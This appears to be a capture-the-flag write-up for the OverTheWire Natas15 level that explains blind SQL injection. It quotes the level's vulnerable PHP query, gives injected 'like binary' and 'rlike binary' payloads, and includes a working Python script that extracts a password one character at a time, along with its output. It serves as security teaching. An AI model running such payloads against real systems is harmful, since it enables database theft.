---
category: natas
title: Natas15 - SQL Injection Part 2 (Blind SQL Injection)
---

website: http://natas15.natas.labs.overthewire.org/ (password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J)

In this challenge, unlike the previous one where the password is printed out directly after a query, different feedback messages are provided based on the query results. Therefore, blind SQL injection applies to this scenario. According to <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">this article</a> on OWASP, blind SQL injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions.

Now let's look at how the web application responds to a query:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
...
$res = mysql_query($query, $link);
...
if(mysql_num_rows($res) > 0) {
    echo "This user exists.<br>";
} else {
    echo "This user doesn't exist.<br>";
}
```

As we can see above, a message "This user exists" is returned if the query is true. Otherwise "This user doesn't exist" is returned.
Therefore, we can come up with the input <small>natas16\" and password like \"%a%</small> in the textbox.
That user input will compose a sql query like this:
```raw
SELECT * from users where username="natas16" and password like "%a%"
```

What the above query does is to test if natas16's password contains letter "a". If so, you will see the message "This user exists". Otherwise you will see a different message. By trying different characters and checking the response, you will eventually be able to guess the correct password.

I came up with a python script that cracks the password. This script takes two steps: 
1. Figure out what characters are contained in the natas16's password.
2. Figure out the final password by guessing the combinations starting from the 1st character until the last character of the password.

```python
#!/usr/bin/env python3

import requests
# import requests.auth
from requests.auth import HTTPBasicAuth


url = "http://natas15.natas.labs.overthewire.org/?debug"
natas15_username = "natas15"
natas15_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

s = requests.Session()
s.auth=HTTPBasicAuth(natas15_username, natas15_password)


def is_hit(data):
    resp = s.post(url, data=data)
    return resp and "exists" in resp.text


def get_password_chars():
    candidate_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    password_chars = ''

    print('Looking for password char set...')
    for char in candidate_chars:
        # to ensure case sensitive, use "like binary" instead of "like"
        data = {'username': f'natas16" and password like binary "%{char}%'}
        if is_hit(data):
            password_chars += char
            print(f'The password contains following chars: {password_chars}')

    return password_chars


def get_password(password_chars):
    password = ""
    for i in range(32):
        print(f'Looking for the position {i}...')

        for char in password_chars:
            # to do pattern match, use "rlike" instead of "like"
            # print(f'Trying char {char}...')
            data = {'username': f'natas16" and password rlike binary "^{password}{char}'}
            if is_hit(data):
                password += char
                print(password)
                break

    return password


# Step 1: Find out what chars the password contains
password_chars = get_password_chars()
print(f'char set contains: {password_chars}')

# Step 2: Find out the password by ordering the chars found in step 1
natas16_password = get_password(password_chars)
```

Running the script, we have the password for natas16, which is "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh":
```shell
$ python3 natas15.py
Looking for password char set...
The password contains following chars: a
The password contains following chars: ac
The password contains following chars: ace
The password contains following chars: aceh
The password contains following chars: acehi
... ... <skipped>
char set contains: acehijmnpqtwBEHINORW03569
Looking for the position 0...
W
Looking for the position 1...
Wa
Looking for the position 2...
WaI
Looking for the position 3...
WaIH
Looking for the position 4...
WaIHE
... ... <skipped>
Looking for the position 30...
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
Looking for the position 31...
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```
